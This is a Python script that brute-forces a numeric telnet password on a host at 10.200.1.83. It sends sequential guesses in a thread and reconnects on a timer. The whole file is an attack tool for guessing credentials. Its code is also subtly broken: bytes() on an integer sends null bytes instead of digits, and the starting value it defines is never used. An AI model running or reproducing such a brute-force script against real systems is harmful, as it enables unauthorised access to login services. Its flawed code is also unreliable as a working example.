import threading
import sys
import telnetlib
import time

password = 3200

def main(password):
    HOST = "10.200.1.83"
    start_time = time.time()
    tn = telnetlib.Telnet(HOST)
    while 1 == 1:
        start_time = time.time()
        print("Trying: ", password)
        tn.read_until(b"Password: ")
        tn.write(bytes(password) + b"\n")
        tn.read_until(b" ERROR: Invalid Password")
        time.sleep(0.03)
        password = password + 1
        if time.time() > start_time+.5:
            print("RESET")
            tn.write(b"ls\n")
            tn.write(b"exit\n")
            tn = telnetlib.Telnet(HOST)
            start_time = time.time()
    return

threads = []
for i in range(1):
    t = threading.Thread(target=main, args=(i,))
    threads.append(t)
    t.start()